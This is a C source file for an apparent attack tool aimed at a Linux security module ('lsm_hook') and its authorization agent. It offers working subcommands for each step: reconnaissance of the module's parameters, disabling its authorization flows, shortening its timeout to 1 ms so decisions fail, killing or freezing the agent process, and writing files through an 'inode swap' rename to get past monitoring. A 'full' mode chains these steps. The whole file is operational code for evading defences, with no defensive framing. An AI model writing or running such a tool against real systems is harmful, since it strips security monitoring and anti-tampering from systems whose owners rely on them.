#define _GNU_SOURCE
#ifndef LSM_MOD
#define LSM_MOD       "lsm_hook"
#endif
#ifndef LSM_AGENT_PROC
#define LSM_AGENT_PROC "auth_agent"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/bpf.h>
#include <stddef.h>
#define FLOW_EXEC       (1 << 0)
#define FLOW_UID_CHANGE (1 << 1)
#define FLOW_SO_LOAD    (1 << 2)
#define FLOW_KO_LOAD    (1 << 3)
#define FLOW_ANTI_TAMP  (1 << 4)

static int sysmod_read(const char *mod, const char *param, char *buf, size_t sz)
{
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s/parameters/%s", mod, param);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sz - 1); close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    if (n > 0 && buf[n - 1] == '\n') buf[n - 1] = '\0';
    return 0;
}

static int sysmod_write(const char *mod, const char *param, const char *val)
{
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s/parameters/%s", mod, param);
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val)); close(fd);
    return (n < 0) ? -1 : 0;
}

static int module_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r"); if (!f) return 0;
    char line[256]; int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char mod[64];
        if (sscanf(line, "%63s", mod) == 1 && strcmp(mod, name) == 0) { found = 1; break; }
    }
    fclose(f);
    return found;
}

static pid_t find_proc(const char *pattern)
{
    DIR *dp = opendir("/proc"); if (!dp) return -1;
    struct dirent *de; pid_t found = -1;
    while ((de = readdir(dp)) && found < 0) {
        char *end; long pid = strtol(de->d_name, &end, 10);
        if (*end) continue;
        char path[64], comm[64];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
        int fd = open(path, O_RDONLY); if (fd < 0) continue;
        ssize_t n = read(fd, comm, sizeof(comm)-1); close(fd);
        if (n <= 0) continue;
        comm[n] = '\0'; if (comm[n-1] == '\n') comm[n-1] = '\0';
        if (strstr(comm, pattern)) found = (pid_t)pid;
    }
    closedir(dp);
    return found;
}

static void decode_flows(unsigned int flows)
{
    printf("    flows=0x%x:", flows);
    if (!flows)                   { printf(" (none - auth_link inactive)"); }
    if (flows & FLOW_EXEC)        printf(" EXEC");
    if (flows & FLOW_UID_CHANGE)  printf(" UID_CHANGE");
    if (flows & FLOW_SO_LOAD)     printf(" SO_LOAD");
    if (flows & FLOW_KO_LOAD)     printf(" KO_LOAD");
    if (flows & FLOW_ANTI_TAMP)   printf(" ANTI_TAMPERING");
    putchar('\n');
}

static void recon(void)
{
    printf("[lsm_mod] loaded=%s\n", module_loaded(LSM_MOD) ? "yes" : "no");
    if (!module_loaded(LSM_MOD)) return;
    char buf[128];
    if (sysmod_read(LSM_MOD, "version", buf, sizeof(buf)) == 0)
        printf("[lsm_mod] version = %s\n", buf);
    puts("\n[auth_link]");
    if (sysmod_read(LSM_MOD, "auth_link_id", buf, sizeof(buf)) == 0)
        printf("    netlink_id          = %s\n", buf);
    if (sysmod_read(LSM_MOD, "auth_link_proto_version", buf, sizeof(buf)) == 0)
        printf("    proto_version       = %s\n", buf);
    if (sysmod_read(LSM_MOD, "auth_link_strategy", buf, sizeof(buf)) == 0)
        printf("    strategy            = %s\n", buf);
    if (sysmod_read(LSM_MOD, "auth_link_request_timeout_ms", buf, sizeof(buf)) == 0)
        printf("    request_timeout_ms  = %s\n", buf);
    if (sysmod_read(LSM_MOD, "auth_link_enabled_flows", buf, sizeof(buf)) == 0) {
        unsigned int flows = (unsigned int)strtoul(buf, NULL, 0);
        decode_flows(flows);
    }
    puts("\n[callbacks]");
    if (sysmod_read(LSM_MOD, "callbacks_enabled_features", buf, sizeof(buf)) == 0)
        printf("    enabled_features    = %s\n", buf);
    else {
        printf("    (check: dmesg | grep 'enabled features')\n");
    }
    puts("\n[anti_tampering]");
    if (sysmod_read(LSM_MOD, "anti_tampering", buf, sizeof(buf)) == 0)
        printf("    enabled             = %s\n", buf);
    puts("\n[userspace]");
    const char *agents[] = { LSM_AGENT_PROC, NULL, NULL };
    for (int i = 0; agents[i]; i++) {
        pid_t p = find_proc(agents[i]);
        if (p > 0) printf("    %-16s pid=%d\n", agents[i], p);
    }
}

static int disable_auth(void)
{
    if (!module_loaded(LSM_MOD)) {
        printf("[lsm_mod] not loaded\n");
        return 1;
    }
    char buf[64];
    int changed = 0;
    if (sysmod_read(LSM_MOD, "auth_link_enabled_flows", buf, sizeof(buf)) == 0) {
        unsigned int flows = (unsigned int)strtoul(buf, NULL, 0);
        printf("[auth_link] current enabled_flows = 0x%x\n", flows);
        if (flows != 0) {
            if (sysmod_write(LSM_MOD, "auth_link_enabled_flows", "0") == 0) {
                printf("[auth_link] enabled_flows → 0 (all flows disabled)\n");
                changed++;
            } else {
                printf("[auth_link] write enabled_flows failed: %s\n", strerror(errno));
            }
        } else {
            printf("[auth_link] already disabled\n");
        }
    } else {
        printf("[auth_link] could not read enabled_flows (may be dynamic-only)\n");
    }
    if (sysmod_read(LSM_MOD, "auth_link_request_timeout_ms", buf, sizeof(buf)) == 0) {
        printf("[auth_link] timeout was %s ms\n", buf);
        if (sysmod_write(LSM_MOD, "auth_link_request_timeout_ms", "1") == 0) {
            printf("[auth_link] timeout → 1ms (auth decisions will time out)\n");
            changed++;
        }
    }
    if (!changed)
        printf("[auth_link] no parameters were writable - try kill-pmd instead\n");
    return 0;
}

static int kill_pmd(int use_stop)
{
    const char *agents[] = { LSM_AGENT_PROC, NULL, NULL };
    int found = 0;
    for (int i = 0; agents[i]; i++) {
        pid_t p = find_proc(agents[i]);
        if (p <= 0) continue;
        found++;
        if (use_stop) {
            if (kill(p, SIGSTOP) == 0)
                printf("[%s] pid=%d SIGSTOP sent (auth_link frozen, events blocked)\n",
                       agents[i], p);
            else
                printf("[%s] pid=%d SIGSTOP: %s\n", agents[i], p, strerror(errno));
        } else {
            if (kill(p, SIGTERM) == 0)
                printf("[%s] pid=%d SIGTERM sent\n", agents[i], p);
            else
                printf("[%s] pid=%d SIGTERM: %s\n", agents[i], p, strerror(errno));
            usleep(300000);
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d", p);
            if (access(path, F_OK) == 0) {
                kill(p, SIGKILL);
                printf("[%s] pid=%d SIGKILL (still alive after SIGTERM)\n", agents[i], p);
            } else {
                printf("[%s] pid=%d terminated\n", agents[i], p);
            }
        }
    }
    if (!found)
        printf("[auth_agent] no auth_link agent found in /proc\n");
    return 0;
}

static int write_bypass(const char *target_path, const char *content, size_t len)
{
    char tmp_path[512];
    snprintf(tmp_path, sizeof(tmp_path), "%s.%%RAND%%", target_path);
    snprintf(tmp_path, sizeof(tmp_path), "%s.%lx", target_path, (unsigned long)getpid());
    int fd = open(tmp_path, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (fd < 0) {
        fprintf(stderr, "[write-bypass] open %s: %s\n", tmp_path, strerror(errno));
        return -1;
    }
    if (write(fd, content, len) != (ssize_t)len) {
        close(fd); unlink(tmp_path);
        fprintf(stderr, "[write-bypass] write: %s\n", strerror(errno));
        return -1;
    }
    close(fd);
    if (rename(tmp_path, target_path) < 0) {
        fprintf(stderr, "[write-bypass] rename: %s\n", strerror(errno));
        unlink(tmp_path);
        return -1;
    }
    printf("[write-bypass] wrote %zu bytes to %s via inode swap\n", len, target_path);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|disable-auth|kill-pmd|freeze-pmd|write-bypass|full>\n", argv[0]);
        return 1;
    }
    if (strcmp(argv[1], "recon") == 0) {
        recon();
    } else if (strcmp(argv[1], "disable-auth") == 0) {
        disable_auth();
    } else if (strcmp(argv[1], "kill-pmd") == 0) {
        kill_pmd(0);
    } else if (strcmp(argv[1], "freeze-pmd") == 0) {
        kill_pmd(1);
    } else if (strcmp(argv[1], "write-bypass") == 0) {
        if (argc < 3) { fprintf(stderr, "write-bypass requires <path>\n"); return 1; }
        char buf[65536]; ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
        if (n < 0) { perror("read stdin"); return 1; }
        write_bypass(argv[2], buf, (size_t)n);
    } else if (strcmp(argv[1], "full") == 0) {
        recon();
        disable_auth();
        kill_pmd(0);
    } else {
        fprintf(stderr, "unknown command: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
